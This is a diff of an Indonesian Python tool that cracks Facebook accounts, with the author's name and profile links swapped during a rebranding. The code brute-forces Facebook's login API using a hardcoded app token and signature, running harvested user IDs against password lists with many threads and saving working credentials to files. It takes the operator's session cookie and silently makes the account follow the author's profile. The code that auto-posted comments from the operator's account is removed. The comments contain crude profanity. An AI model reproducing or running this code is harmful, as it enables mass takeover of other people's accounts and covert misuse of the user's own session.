@@ -2,9 +2,9 @@
 # -*- coding: utf-8 -*-
 #Males gw encrypt Tod jika mau recode, recode aja
 #Tapi ngotak dikit jangan Lo jual belikan sc ini kontol
-#Code by YayanXD 
+#Code by SyafiiXD 
 #Created 05-07-2020
-#My facebook (https://www.facebook.com/105432708823953)
+#My facebook (https://www.facebook.com/100080716718035)
 
 import os,sys,re,time,json,random,requests
 from bs4 import BeautifulSoup as parser
@@ -30,7 +30,7 @@ def kontol():
 \x1b[1;94m────────────────────────────────────────────────────
 \x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Author   : Mhd Syafii
 \x1b[1;97m [\x1b[1;92m•\x1b[1;94m•\x1b[1;97m] Github   : https://github.com/Syafii-XD
-\x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Facebook : https://www.facebook.com/fikritampan305
+\x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Facebook : https://www.facebook.com/100080716718035
 \x1b[1;94m────────────────────────────────────────────────────""")
 
 def jembut():
@@ -43,7 +43,7 @@ def jembut():
 \x1b[1;94m────────────────────────────────────────────────────
 \x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Author   : Mhd Syafii
 \x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Github   : https://github.com/Syafii-XD
-\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Facebook : https://www.facebook.com/105432708823953
+\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Facebook : https://www.facebook.com/100080716718035
 \x1b[1;94m────────────────────────────────────────────────────""")
 
 def yayanxd():
@@ -80,79 +80,47 @@ def moch_yayan():
              except FileNotFoundError:
                    ikeh_ikeh_kimochi()
                    kontol()
-                   cek = input("\n\033[0;92m       [ \033[0;97mThis Tool Use Facebook Cookies \033[0;92m]\n\n\033[97m [\033[91m?\033[97m] Cookies \033[1;91m: \033[1;96m")
-                   print('\n\033[97m [\033[92m+\033[97m] \033[92mPleas Wait...')
-                   cek = {"cookie":cek}
-                   ismi = requests.Session().get(host.format("/me"),verify=False,cookies=cek).content
-                   if "mbasic_logout_button" in str(ismi):
-                   if "Apa yang Anda pikirkan sekarang" in str(ismi):
-                pass
-            else:
-                try:
-                    requests.Session().get(host.format(parser.str(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=cek)
-                except:
-                    pass
-            try:
-                # please don't remove this or change
-                # you can added this block
-                # Comment to author
-                x = {}
-                to = parser(requests.Session().get(host.format("/photo.php?fbid=105432955490595&id=100080716718035&set=a.105432912157266&source=48"),cookies=cek).content,"html.parser")
-                joe = re.findall('"><form action="(/a/comment.php\?fs=.*?)".*?name="fb_dtsg".*?value="(.*?)".*?name="jazoest".*?value="(\d*)"',str(to))[0]
-                x["fb_dtsg"] = joe[1]
-                x["jazoest"] = joe[2]
-                kata = ['Mantap Bang','Semangat Terus','Gokil Suhu','Panutanku']
-                x["comment_text"] = random.choice(kata)
-                requests.Session().post(host.format(joe[0].replace("&amp;","&")),data=x,cookies=cek)
-                ikuti = parser(requests.Session().get(host.format("/100080716718035"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
-                requests.Session().get(host.format(ikuti),cookies=cek)
+                   cek = input("\n\033[0;92m       [ \033[0;97mJangan gunakan akun pribadi \033[0;92m]\n\n\033[97m [\033[91m?\033[97m] Masukkan Cookie \033[1;91m: \033[1;96m")
+                   print('\n\033[97m [\033[92m+\033[97m] \033[92mLoading...')
+             cek = {"cookie":cek}
+             ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
+             if "mbasic_logout_button" in str(ismi):
+                     if "Apa yang Anda pikirkan sekarang" in str(ismi):
+                             with open("cookies","w") as f:
+                                     f.write(cek["cookie"])
+                     else:
+                           print("\033[1;97m[\033[1;94m•\033[1;97m] \033[00mUbah bahasa, harap tunggu\033[1;91m!!\033[00m")
+                           try:
+                                  requests.get(mbasic.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=cek)
+                           except:
+                                  pass
+                     try:
+                             ikuti = parser(requests.get(mbasic.format("/100080716718035"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
+                             ses.get(mbasic.format(ikuti),cookies=cek)
                      except :
                              pass
                      return cek["cookie"]
-                     print('\033[1;97m[\033[1;94m√\033[1;97m] \033[1;92mLogin Successfully')
+                     aahh('\033[1;97m[\033[1;94m√\033[1;97m] \033[1;92mLogin Successfully')
              else:
-                  os.system("xdg-open https://youtu.be/DF7bUCn0GFY") 
+                  os.system("xdg-open https://m.facebook.com/photo.php?fbid=105432955490595&id=100080716718035&set=a.105432912157266&source=48") 
                   os.system('rm -rf cookies')
                   print(" \n \x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Cookies Error")
                   os.system('python Cr4ck.py')
-def val(host,kuki):
-    try:
-        kuki = {"cookie":kuki}
-        ismi = requests.Session().get(host.format("/me"),verify=False,cookies=kuki).content
-        if "mbasic_logout_button" in str(ismi):
-            if "Apa yang Anda pikirkan sekarang" in str(ismi):
-                pass
-            else:
-                try:
-                    requests.Session().get(host.format(parser.str(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=kuki)
-                except:
-                    pass
-            try:
-                # please don't remove this or change
-                # you can added this block
-                # Comment to author
-                x = {}
-                to = parser(requests.Session().get(host.format("/photo.php?fbid=105432955490595&id=100080716718035&set=a.105432912157266&source=48"),cookies=kuki).content,"html.parser")
-                joe = re.findall('"><form action="(/a/comment.php\?fs=.*?)".*?name="fb_dtsg".*?value="(.*?)".*?name="jazoest".*?value="(\d*)"',str(to))[0]
-                x["fb_dtsg"] = joe[1]
-                x["jazoest"] = joe[2]
-                kata = ["Hy, I'm Facebook cracker user","Toolsnya mantap","Buset bro, sumpah ini keren!!"]
-                x["comment_text"] = random.choice(kata)
-                requests.Session().post(host.format(joe[0].replace("&amp;","&")),data=x,cookies=kuki)
          def login(username,password,cek=False):
              global die,check,result,count
              b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
              params = {
-            'access_token': b,
-            'format': 'JSON',
-            'sdk_version': '2',
-            'email': username,
-            'locale': 'en_US',
-            'password': password,
-            'sdk': 'ios',
-            'generate_session_cookies': '1',
-            'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
-            api = 'https://b-api.facebook.com/method/auth.login'
+                     'access_token': b,
+                     'format': 'JSON',
+                     'sdk_version': '2',
+                     'email': username,
+                     'locale': 'en_US',
+                     'password': password,
+                     'sdk': 'ios',
+                     'generate_session_cookies': '1',
+                     'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
+             }
+             api = 'https://b-api.facebook.com/method/auth.login'
              response = requests.get(api, params=params)
              if 'EAA' in response.text:
                  print(f"\r\033[1;92m  * --> {username}|{password}                       ",end="")
@@ -242,21 +210,21 @@ def val(host,kuki):
                    kuki = {'cookie':kukis}
                    ikeh_ikeh_kimochi()
                    kontol()
-                   print('\033[1;97m [\033[1;92m01\033[1;97m] Crack From ID Friend')
-                   print('\033[1;97m [\033[1;92m02\033[1;97m] Crack From ID Link Posting')
-                   print('\033[1;97m [\033[1;92m03\033[1;97m] Crack From ID Search Name')
-                   print('\033[1;97m [\033[1;92m04\033[1;97m] Crack From ID Group ')
-                   print('\033[1;97m [\033[1;92m05\033[1;97m] Crack From ID Publick ')
-                   print('\033[1;97m [\033[1;92m06\033[1;97m] View Crack Results')
-                   print('\033[1;97m [\033[1;92m07\033[1;97m] Delete Cookies')
-                   print('\033[1;97m [\033[1;91m00\033[1;97m] Exit')
+                   aahh('\033[1;97m [\033[1;92m01\033[1;97m] Crack From ID Friend')
+                   aahh('\033[1;97m [\033[1;92m02\033[1;97m] Crack From ID Link Posting')
+                   aahh('\033[1;97m [\033[1;92m03\033[1;97m] Crack From ID Search Name')
+                   aahh('\033[1;97m [\033[1;92m04\033[1;97m] Crack From ID Group ')
+                   aahh('\033[1;97m [\033[1;92m05\033[1;97m] Crack From ID Publick ')
+                   aahh('\033[1;97m [\033[1;92m06\033[1;97m] View Crack Results')
+                   aahh('\033[1;97m [\033[1;92m07\033[1;97m] Delete Cookies')
+                   aahh('\033[1;97m [\033[1;91m00\033[1;97m] Exit')
                    print('\x1b[1;94m────────────────────────────────────────────────────')
                    memek = input('\x1b[1;97m [\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ')
                    if memek =="":
                          print("\n\n\033[00m [\033[91m!\033[00m] Wrong Input!")
                          yayanxd()
                    elif memek == '0' or memek =='00':
-                         print("\n\033[1;92m Thank you for using my tools.\n  Don't forget to subscribe to My YouTube Channel\n\n")
+                         aahh("\n\033[1;92m Thank you for using my tools.\n  Don't forget to subscribe to My YouTube Channel\n\n")
                          os.system('xdg-open https://youtube.com/channel/UCNvDaXoyAVCNJbSqtaXA-mg')
                          exit()                   	
                    elif memek == '7' or memek =='07':
@@ -338,8 +306,8 @@ def val(host,kuki):
                    ikeh_ikeh_kimochi()
                    jembut()
                    print('\n\x1b[1;96m        ✰★✰╭⍝╮⎝҂⚆⏝⚆⍀⎠╭⍝╮✰★✰')
-                   print('\x1b[1;95m     疊╔═╦═────••♽••─────═╦═╗疊')
-                   print('\x1b[1;97m           Total ID\x1b[1;91m :\x1b[1;92m ' + str(len(id)) + "\n\x1b[1;95m     疊╚═╩═────••♽••─────═╩═╝疊\n",end="")       
+                   print('\x1b[1;95m     疊╔═╦═────••☺••─────═╦═╗疊')
+                   print('\x1b[1;97m           Total ID\x1b[1;91m :\x1b[1;92m ' + str(len(id)) + "\n\x1b[1;95m     疊╚═╩═────••🥰••─────═╩═╝疊\n",end="")       
                    expass = input("\n\033[1;97m [\033[1;96m?\033[1;97m] Add Password1 \033[1;91m: \033[1;92m")
                    expass = input("\033[1;97m [\033[1;96m?\033[1;97m] Add Password2 \033[1;91m: \033[1;92m")
                    expass = input("\033[1;97m [\033[1;96m?\033[1;97m] Add Password3 \033[1;91m: \033[1;92m")
@@ -347,10 +315,10 @@ def val(host,kuki):
                    ikeh_ikeh_kimochi()
                    jembut()
                    print('\n\x1b[1;92m        ✰★✰╭⍝╮⎝҂⚆⏝⚆⍀⎠╭⍝╮✰★✰')
-                   print('\x1b[1;97m     疊╔═╦═────••♽••─────═╦═╗疊')
-                   print('\x1b[1;96m           Total ID\x1b[1;91m :\x1b[1;94m ' + str(len(id)) + "\n\x1b[1;97m     疊╚═╩═────••♽••─────═╩═╝疊\n",end="")
+                   print('\x1b[1;97m     疊╔═╦═────••😁••─────═╦═╗疊')
+                   print('\x1b[1;96m           Total ID\x1b[1;91m :\x1b[1;94m ' + str(len(id)) + "\n\x1b[1;97m     疊╚═╩═────••😘••─────═╩═╝疊\n",end="")
                    print('\n\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] the result\x1b[1;92m OK\x1b[1;97m saved to : ok.txt\n [\x1b[1;93m-\x1b[1;97m] the result\x1b[1;93m CP\x1b[1;97m saved to : cp.txt')
-                   print('\n [\x1b[1;91m!\x1b[1;97m] turn off data to stop the process\n')
+                   print('\n [\x1b[1;91m!\x1b[1;97m] Jika tidak ada hasil mainkan mode pesawat 5 menit\n')
                    with ThreadPoolExecutor(max_workers=30) as ex:
                           for user in username:
                                   users = user.split('|')
